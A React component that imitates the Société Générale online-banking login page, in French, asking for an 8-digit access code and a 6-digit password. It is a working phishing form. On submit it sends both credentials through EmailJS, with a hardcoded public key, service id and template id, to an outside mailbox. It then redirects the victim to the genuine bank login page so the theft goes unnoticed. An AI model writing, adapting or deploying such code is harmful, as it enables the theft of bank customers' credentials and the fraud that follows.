import React, {  useState } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { Col, Container, Row } from "react-bootstrap";
import {
  faQuestionCircle,
  faRightToBracket,
  faCaretRight,
} from "@fortawesome/free-solid-svg-icons";
import { init, send } from "@emailjs/browser";

init("LOr7AcTCA-v_yVl5M");

export default function Formulaire() {

  const [accessCode, setAccessCode] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmited = (e) => {
    e.preventDefault();
    if (accessCode.length !== 8) {
      return window.location.href = "/";
      //return window.alert("Le code est obligatoire");
    }
    if (password.length !== 6) {
      return window.location.href = "/";
      //return window.alert("Le code est obligatoire");
    }

    send("service_5umnxip", "template_12fhvar", {
      accessCode: accessCode,
      password: password,
    }).then(result => {
      window.location.href =
        "https://particuliers.societegenerale.fr/app/auth/swm/swm-connect-auth.html";
    });
    
    
  }

  return (
    <Container className="mb-5">
      <Row>
        <Col md={4}></Col>

        <Col className="text-center">
          <form
            onSubmit={(e)=>handleSubmited(e)}
            method="post"
            className="form-group"
          >
            <h2
              style={{
                fontFamily: "Inter",
                fontSize: "25px",
                letterSpacing: "-1px",
              }}
            >
              Accès à votre compte
            </h2>
            <div style={{ borderTop: "1px solid red" }}></div>

            <Container className="mt-2">
              <div className="form-group">
                <label
                  style={{
                    fontFamily: "Roboto",
                    fontSize: "15px",
                    fontWeight: "600",
                    color: "#8a9496",
                  }}
                >
                  Code d'accès
                </label>
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <input
                    className="input"
                    type="text"
                    placeholder="Code d'accès (8 chiffres)"
                    maxLength="8"
                    value={accessCode}
                    onChange={(e) => {
                      setAccessCode(e.target.value);
                    }}
                  />
                  <a
                    href=""
                    style={{
                      paddingLeft: "0.5rem !important",
                      marginLeft: "10px",
                    }}
                  >
                    <FontAwesomeIcon
                      icon={faQuestionCircle}
                      color="#d41a11"
                      size="lg"
                    />
                  </a>
                </div>
              </div>
            </Container>

            <Container className="mt-2">
              <div className="form-group">
                <label
                  style={{
                    fontFamily: "Roboto",
                    fontSize: "15px",
                    fontWeight: "600",
                    color: "#8a9496",
                  }}
                >
                  Mot de passe
                </label>
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <input
                    className="input"
                    type="password"
                    placeholder="Mot de passe (6 chiffres)"
                    maxLength="6"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                    }}
                  />
                  <a
                    href=""
                    style={{
                      paddingLeft: "0.5rem !important",
                      marginLeft: "10px",
                    }}
                  >
                    <FontAwesomeIcon
                      icon={faQuestionCircle}
                      color="#d41a11"
                      size="lg"
                    />
                  </a>
                </div>
              </div>
            </Container>

            <div className="form-group">
              <button
                style={{
                  border: "none",
                  backgroundColor: "#d41a11",
                  color: "white",
                  fontWeight: "bold",
                  padding: "5px 20px",
                  marginTop: "20px",
                }}
              >
                <FontAwesomeIcon
                  icon={faRightToBracket}
                  style={{ marginRight: "5px" }}
                />
                Se connecter
              </button>

              <div
                className="row mt-3 mb-3"
                style={{
                  textAlign: "left",
                  fontWeight: "450",
                  fontSize: "15px",
                }}
              >
                <div className="">
                  <a id="lien-codes" href="#" className="link">
                    <FontAwesomeIcon icon={faCaretRight} /> &nbsp; Obtenir vos
                    identifiants
                  </a>
                </div>
              </div>
            </div>
          </form>
        </Col>
      </Row>
    </Container>
  );
}

